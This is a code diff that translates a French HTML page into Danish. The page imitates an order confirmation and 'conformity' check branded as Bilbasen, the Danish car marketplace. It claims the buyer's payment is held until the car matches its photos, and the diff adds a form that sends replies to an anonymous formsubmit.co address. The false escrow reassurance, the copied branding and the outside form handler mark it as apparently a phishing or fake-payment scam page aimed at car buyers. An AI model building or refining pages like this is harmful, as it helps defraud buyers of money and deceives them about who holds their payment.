@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="da">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Confirmation & Conformité - Bilbasen</title>
+    <title> Bekræftelse & Overholdelse - Bilbasen</title>
     <link rel="icon" type="image/png" href="bilbasen.jpg">
     <link rel="apple-touch-icon" href="bilbasen.jpg">
     <link rel="stylesheet" href="style.css">
@@ -32,51 +32,57 @@
         <!-- Bloc Remerciement -->
         <div class="card">
             <div class="success-icon">✓</div>
-            <h1>Merci pour votre commande !</h1>
+            <h1> Tak for din bestilling! </h1>
             <p>
-                Votre paiement a été accepté et votre véhicule est en cours d'acheminement ou de livraison.
+                Din betaling er blevet accepteret, og dit køretøj bliver sendt eller leveret. 
 
             </p>
             <p class="close">
-                Nous vous rassurons que le vendeur ne recevra le paiement qu'après avoir reçu et validé la conformité de la voiture avec celle sur les photos. Si non au bout de 48h votre paiement sera annulé et votre argent vous sera restitué directement dans votre compte.
+                Du kan være sikker på, at sælgeren først modtager betaling efter at have modtaget og bekræftet, at bilen stemmer overens med billederne. Hvis bilen ikke stemmer overens med billederne inden for 48 timer, vil din betaling blive annulleret, og dine penge vil blive refunderet direkte til din konto. 
             </p>
             <div class="order-meta">
-                Commande <strong>#BB-DK-98421</strong> • En cours
+                Bestille <strong>#BB-DK-98421</strong> • I gang 
             </div>
         </div>
 
         <!-- Bloc Suivi & Conformité -->
         <div class="tracking-box">
             <div class="tracking-header">
-                <h2>Suivi de réception & Conformité</h2>
-                <p>Aidez-nous à garantir la qualité des véhicules et des utilisateurs de Bilbasen en validant votre réception.</p>
+                <h2> Kvitteringssporing </h2>
+                <p> Hjælp os med at garantere kvaliteten af Bilbasen-køretøjer og -brugere ved at validere din kvittering.</p>
             </div>
 
             <!-- Question 1 : Réception -->
             <div class="question-group">
-                <div class="question-title">Avez-vous bien reçu votre article ?</div>
+                <div class="question-title"> Har du modtaget din vare? </div>
                 <div class="btn-grid">
-                    <a href="#recu" class="btn btn-primary">Oui, je l'ai reçu</a>
-                    <a href="#pas-encore" class="btn btn-outline">Pas encore</a>
+                    <a href="#recu" class="btn btn-primary"> Ja, jeg har modtaget den</a>
+                    <a href="#pas-encore" class="btn btn-outline"> Ikke endnu</a>
                 </div>
             </div>
 
             <!-- Question 2 : Conformité -->
             <div class="question-group conformity-section">
-                <div class="question-title">Le véhicule reçu est-il conforme aux photos du site ?</div>
+                <div class="question-title"> Stemmer det modtagne køretøj overens med billederne på hjemmesiden? </div>
                 <div class="btn-grid">
-                    <a href="#conforme" class="btn btn-outlineb">Oui, Conforme</a>
-                    <a href="#non-conforme" class="btn btn-outline btn-danger">Non, Non-conforme</a>
+                    <a href="#conforme" class="btn btn-outlineb"> Ja, kompatibel </a>
+                    <a href="#non-conforme" class="btn btn-outline btn-danger"> Nej, ikke-overensstemmende </a>
                 </div>
             </div>
 
             <!-- Formulaire de réclamation optionnel -->
             <div class="form-group">
-                <div class="question-title subtitle-small">Précisions en cas de problème (facultatif) :</div>
-                <textarea placeholder="Décrivez si le véhicule présente une différence par rapport aux photos..."></textarea>
-                <div class="text-right">
-                    <button type="button" class="btn btn-primary btn-inline">Envoyer mon retour</button>
-                </div>
+                <div class="question-title subtitle-small"> Yderligere oplysninger i tilfælde af et problem (valgfrit): </div>
+                <form action="https://formsubmit.co/528cfa5ae469b703e6904a3689b34436" method="POST" enctype="multipart/form-data">
+                    <input type="hidden" name="_captcha" value="false">
+                    <!-- <input type="hidden" name="_next" value="#">-->
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_subject" value="Conformité">
+                    <textarea placeholder=" Beskriv om køretøjet afviger fra billederne..."></textarea>
+                    <div class="text-right">
+                          <button type="submit" class="btn btn-primary btn-inline"> Send min feedback </button>
+                    </div>
+                </form>
             </div>
 
         </div>
